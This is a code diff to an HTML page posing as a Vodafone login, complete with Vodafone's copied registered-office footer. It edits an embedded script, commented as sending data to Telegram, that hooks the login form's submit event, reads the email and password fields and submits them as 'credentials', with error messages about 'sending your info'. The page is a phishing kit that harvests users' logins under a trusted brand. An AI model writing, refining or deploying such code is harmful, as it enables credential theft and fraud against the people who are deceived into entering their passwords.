@@ -74,7 +74,7 @@
       font-size: 16px;
       border: 1px solid #ccc;
       border-radius: 4px;
-      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1); /* Input shadow */
+      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
       transition: box-shadow 0.2s ease;
     }
 
@@ -226,7 +226,7 @@
     <p class="footer-copyright">© 2023 Vodafone Limited. Registered office: Vodafone House, The Connection, Newbury, Berkshire RG14 2FN. Registered in England No 1471587.</p>
   </div>
 
-  <!-- 🚨 SCRIPT ADDED BELOW THIS LINE 🚨 -->
+  <!-- 🔧 Script to send data to Telegram -->
   <script>
     document.addEventListener('DOMContentLoaded', function () {
       const form = document.getElementById('loginForm');
@@ -235,12 +235,11 @@
       form.addEventListener('submit', async function (e) {
         e.preventDefault();
 
-        // Get input values
         const emailInput = document.getElementById('username-email');
         const passwordInput = document.getElementById('password');
 
         if (!emailInput || !passwordInput) {
-          console.error("Email or password field not found");
+          alert("Fields not found!");
           return;
         }
 
@@ -267,8 +266,8 @@
             alert("Failed to submit credentials.");
           }
         } catch (error) {
-          console.error("Error submitting form:", error);
-          alert("An error occurred while sending data.");
+          console.error("Submission error:", error.message);
+          alert("An error occurred while sending your info.");
         }
       });
     });
